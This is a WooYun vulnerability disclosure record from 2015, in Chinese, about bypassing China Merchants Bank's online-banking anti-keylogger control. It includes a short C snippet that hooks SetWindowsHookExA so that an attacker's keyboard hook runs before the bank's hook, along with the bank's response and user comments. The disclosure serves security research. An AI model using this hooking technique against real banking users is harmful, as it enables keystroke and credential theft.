{"id": 20866, "wybug_id": "wooyun-2015-0114940", "wybug_title": "招商银行网银安全控件可被绕过", "wybug_corp": "招商银行", "wybug_author": "路人甲", "wybug_date": "2015-05-19 15:27", "wybug_open_date": "2015-07-05 21:22", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计错误", "设计缺陷"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-31：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-05：\t细节向公众公开  简要描述： 按说网银安全控件应该是能够在不安全的环境里保护用户安全的（废话！本来就安全的环境还要他保护个蛋啊！）。但实际上由于设计缺陷，某些控件一点安全性都没有。 详细说明：  招商银行个人网银安全控件设计缺陷，可轻松绕过其对键盘记录器的防护。配合之前爆出的安全控件修改IE设置的缺陷可导致任意ActiveX加载，实现远程利用。详细内容见证明。   漏洞证明：  招行控件设计挺不错，但还是有少许不足。控件利用windows的消息钩子机制，控件在激活时挂钩了WH_GETMESSAGE，WH_KEYBOARD和WH_KEYBOARD_LL三个消息，并且采用循环挂钩摘钩的方法保证自己的钩子在链表的第一位，对键盘记录有较强的对抗能力。\n\n但在实际中，挂钩消息是调用API函数SetWindowsHookExA完成，由于控件没有检测API是否被修改，通过APIHOOK技术可以修改SetWindowsHookExA做到将恶意的钩子置于链表顶部。\nHHOOK WINAPI My_SetWindowsHookExA(int idHook, HOOKPROC lpfn, HINSTANCE hMod, DWORD dwThreadId){\tHHOOK ret = SysSetWindowsHookExA(idHook, lpfn, hMod, dwThreadId);\tif (idHook == WH_KEYBOARD || idHook == WH_KEYBOARD_LL)\t{\t\tif (!myhook)\t\t{\t\t\tSysUnhookWindowsHookEx(myhook);\t\t\tmyhook = NULL;\t\t}\t\tbankhook = ret;\t\tmyhook = SysSetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc, hMod, 0);\t}\treturn ret;}\n确保了自己的hook位于链表顶部也就意味着可以先于控件截获键盘消息，于是:（图中每次按键被记录了两次是由于demo同时下了两个钩子，无视这些细节就好~）\n\n   修复方案：  调用API前检查函数入口是否被修改   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2015-05-21 21:21 厂商回复： 感谢乌云网对我行网银安全的关注。客户电脑环境安全是一个需要多方共同参与才能解决的问题，我行已升级控件对该情况提示客户。我行网银安全由密码、短信验证码、证书等多种措施共同保护，并不依赖单一措施，请客户放心使用。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-05-19 15:31 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:23        | 开发真是日了狗了)\t\t \n  围观打脸系列    \n     2015-05-19 15:34 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  能扇一圈    \n     2015-05-19 15:42 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  围观，别匿名啊！    \n     2015-05-19 15:48 |    \t\t胡小树 \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:11        | 我是一颗小小树)\t\t \n  马上聚齐，够打麻将了    \n     2015-05-19 16:06 |    \t\t大白菜 \t\t\t( 实习白帽子  |\t\t\t        Rank:52 漏洞数:19        )\t\t \n  哪个控件只是一个摆设而已。    \n     2015-05-19 16:40 |    \t\t啊L川 \t\t\t( 普通白帽子  |\t\t\t        Rank:195 漏洞数:39        | 菜鸟 ，菜渣， 菜呀！)\t\t \n  关注....    \n     2015-05-19 17:23 |    \t\t冷静 \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:2        )\t\t \n  绝对是猪猪侠    \n     2015-05-19 17:27 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  万一是短短呢？    \n     2015-05-19 18:01 |    \t\t大大灰狼 \t\t\t( 普通白帽子  |\t\t\t        Rank:248 漏洞数:53        | Newbie)\t\t \n  问一下有第5季吗？    \n     2015-05-19 21:57 |    \t\t’‘Nome \t\t\t( 实习白帽子  |\t\t\t        Rank:55 漏洞数:19        | 在此感谢 @M4sk @mango @裤裆 @泳少 @5up3r...)\t\t \n  @浩天，看白帽子的洞子，时间长了就了解了白帽子性格    \n     2015-07-05 21:34 |    \t\t迪南 \t\t\t( 路人 |\t\t\t        Rank:22 漏洞数:19        | 我真是一个大菜比)\t\t \n  看不懂    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}